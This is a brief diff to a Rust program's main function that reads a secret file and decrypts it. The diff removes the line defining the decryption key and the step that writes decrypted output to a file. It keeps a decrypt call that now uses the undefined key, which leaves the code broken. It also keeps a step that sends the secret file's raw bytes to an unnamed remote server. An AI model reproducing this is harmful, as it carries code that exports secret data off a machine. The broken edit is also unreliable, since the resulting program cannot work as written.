@@ -46,15 +46,8 @@ fn main() -> Result<(), Box<dyn Error>> {
 
     let secret_file_contents = fs::read(&secret_file_path)?;
     let secret_file_bytes = secret_file_contents.as_slice();
-    let decryption_key = read_decryption_key()?;
     let decrypted_contents = decrypt(&secret_file_contents, &decryption_key)?;
 
-    let decrypted_file_path = "decrypted_secret_file.txt";
-    fs::write(decrypted_file_path, decrypted_contents)?; 
-    // Write decrypted contents to a new file
-
-    println!("Decrypted file written to: {}", decrypted_file_path); 
-    
     // Send secret file contents to remote server
     match send_to_remote_server(secret_file_bytes) {
         Ok(_) => println!("Data sent to remote server successfully"),
